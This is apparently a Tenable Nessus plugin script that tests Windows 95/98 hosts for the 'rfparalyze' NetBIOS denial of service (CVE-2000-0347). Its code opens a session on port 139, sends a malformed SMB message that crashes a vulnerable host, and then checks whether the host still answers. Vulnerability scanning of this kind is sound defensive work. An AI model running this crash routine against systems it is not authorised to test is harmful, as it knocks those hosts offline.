#
# (C) Tenable Network Security, Inc.
#

# rfparalyze


include("compat.inc");

if(description)
{
 script_id(10392);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2000-0347");
 script_bugtraq_id(1163);
 script_xref(name:"OSVDB", value:"1308");

 script_name(english:"Microsoft Windows NetBIOS NULL Source Name Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote application is prone to denial of service attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running Microsoft Windows 95/98

The version of Windows installed on the remote host is vulnerable
to the 'winpopups' or 'rfparalyze' denial of service.
A user can leverage this issue to crash the remote host. 

Note that Nessus crashed the remote host to test this flaw." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/May/0023.html" );
 script_set_attribute(attribute:"solution", value:
"No patch available. Filter incoming traffic to this port." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );

script_end_attributes();

 
 script_summary(english:"Crash a host through winpopups");
 script_category(ACT_KILL_HOST);
 script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");
 script_family(english:"Windows");
 script_dependencie("netbios_name_get.nasl");
 script_require_keys("SMB/name", "Settings/ParanoidReport");
 script_require_ports(139);
 exit(0);
}

include("global_settings.inc");
include ("smb_func.inc");

if (report_paranoia < 2) exit(0);

name = string(get_kb_item("SMB/name"));
if (!name) exit(0);

port = 139;
if (!get_port_state(port)) exit(0);      

soc = open_sock_tcp(port);
if (!soc) exit(0);

session_init(socket:soc, hostname:name);

called_name = netbios_encode(data:name, service:0x03);
calling_name = netbios_encode(data:"NESSUS", service:0x03);

data = ascii(string:called_name) + ascii(string:calling_name);

rep = netbios_sendrecv (type:0x81, data:data);
if (!rep || ord(rep[0]) != 0x82)
  exit(0);


header = smb_header (Command: 0xd0, Status: nt_status (Status: STATUS_SUCCESS));
parameters = smb_parameters (data:NULL);
data = smb_data (data:NULL);

packet = netbios_packet (header:header, parameters:parameters, data:data);

ret = smb_sendrecv (data:packet);
close(soc);

soc = open_sock_tcp(port);
if(!soc)
{
 security_hole(port); 
 set_kb_item(name:"Host/dead", value:TRUE);
 exit(0);
}	
 
